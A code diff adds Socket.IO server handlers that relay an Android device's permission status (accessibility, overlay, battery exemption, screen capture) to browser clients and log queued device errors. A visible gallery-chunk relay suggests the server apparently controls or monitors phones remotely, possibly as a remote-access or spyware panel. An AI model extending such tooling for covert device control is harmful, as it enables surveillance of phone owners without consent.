@@ -913,6 +913,111 @@ io.on("connection", (socket) => {
         } catch (e) {}
     });
 
+    // Socket relay for device-permissions-status from Android device
+    socket.on("device-permissions-status", (data) => {
+        try {
+            if (!data) return;
+            const devId = (typeof data === "object" && (data.deviceId || data.devId || data.id)) || "";
+            const devName = (typeof data === "object" && data.deviceName) ? ` (${data.deviceName})` : "";
+            const devInfo = devId ? ` (${devId}${devName})` : "";
+
+            let logMsg = "";
+            if (typeof data === "string") {
+                logMsg = data.startsWith("[PERMISSIONS]") ? data : `[PERMISSIONS] ${data}`;
+            } else if (typeof data === "object") {
+                const p = data.permissions || data;
+                const formatStatus = (val) => {
+                    if (val === true || val === "true" || val === 1 || val === "1" || val === "GRANTED" || val === "granted" || val === "active" || val === "ACTIVE") return "GRANTED";
+                    if (val === false || val === "false" || val === 0 || val === "0" || val === "DENIED" || val === "denied") return "DENIED";
+                    if (val !== undefined && val !== null && val !== "") return String(val).toUpperCase();
+                    return "NOT_SET";
+                };
+
+                const acc = formatStatus(p.accessibility !== undefined ? p.accessibility : p.acc);
+                const ovl = formatStatus(p.overlay !== undefined ? p.overlay : (p.drawOverlays !== undefined ? p.drawOverlays : p.overlayPermission));
+                const bat = formatStatus(p.battery !== undefined ? p.battery : (p.batteryOptimization !== undefined ? !p.batteryOptimization : (p.ignoringBatteryOptimizations !== undefined ? p.ignoringBatteryOptimizations : p.batteryIgnoring)));
+                const mp  = formatStatus(p.mediaProjection !== undefined ? p.mediaProjection : (p.projection !== undefined ? p.projection : (p.screenCapture !== undefined ? p.screenCapture : p.mediaProjectionActive)));
+
+                logMsg = `[PERMISSIONS]${devInfo} Accessibility: ${acc} | Overlay: ${ovl} | Battery: ${bat} | MediaProjection: ${mp}`;
+            } else {
+                logMsg = `[PERMISSIONS] ${String(data)}`;
+            }
+
+            addRuntimeLog("device", "info", "Permissions", logMsg);
+
+            // Relay to browser clients
+            const targetSocketId = data && typeof data === "object" && data.targetSocketId;
+            if (targetSocketId) {
+                io.to(targetSocketId).emit("device-permissions-status", data);
+                io.to(targetSocketId).emit("permissions-status-log", data);
+            } else {
+                socket.broadcast.emit("device-permissions-status", data);
+                socket.broadcast.emit("permissions-status-log", data);
+            }
+        } catch (e) {
+            console.error("device-permissions-status error:", e);
+        }
+    });
+
+    // Support permissions-status-log relay as well
+    socket.on("permissions-status-log", (data) => {
+        try {
+            if (!data) return;
+            const targetSocketId = data && typeof data === "object" && data.targetSocketId;
+            if (targetSocketId) {
+                io.to(targetSocketId).emit("permissions-status-log", data);
+            } else {
+                socket.broadcast.emit("permissions-status-log", data);
+            }
+        } catch (e) {}
+    });
+
+    // Socket handler for flush-device-logs (queued offline errors/crashes from Android device)
+    socket.on("flush-device-logs", (data) => {
+        try {
+            if (!data) return;
+            let logsList = [];
+            let devId = "";
+            let devName = "";
+
+            if (typeof data === "object" && !Array.isArray(data)) {
+                devId = data.deviceId || data.devId || data.id || "";
+                devName = data.deviceName || "";
+                if (Array.isArray(data.logs)) {
+                    logsList = data.logs;
+                } else if (Array.isArray(data.errors)) {
+                    logsList = data.errors;
+                } else if (data.log || data.error || data.message || data.msg) {
+                    logsList = [data.log || data.error || data.message || data.msg];
+                } else {
+                    logsList = [data];
+                }
+            } else if (Array.isArray(data)) {
+                logsList = data;
+            } else {
+                logsList = [data];
+            }
+
+            const prefix = devId ? `[${devId}${devName ? ' ' + devName : ''}] ` : "";
+
+            logsList.forEach((item) => {
+                let errText = "";
+                if (typeof item === "string") {
+                    errText = item;
+                } else if (item && typeof item === "object") {
+                    errText = item.error || item.msg || item.message || item.stack || JSON.stringify(item);
+                } else {
+                    errText = String(item);
+                }
+                if (errText) {
+                    addRuntimeLog("device", "error", "HistoricalError", `${prefix}${errText}`);
+                }
+            });
+        } catch (e) {
+            console.error("flush-device-logs error:", e);
+        }
+    });
+
     socket.on("gallery-chunk", (data) => {
         try {
             const targetSocketId = data && data.targetSocketId;
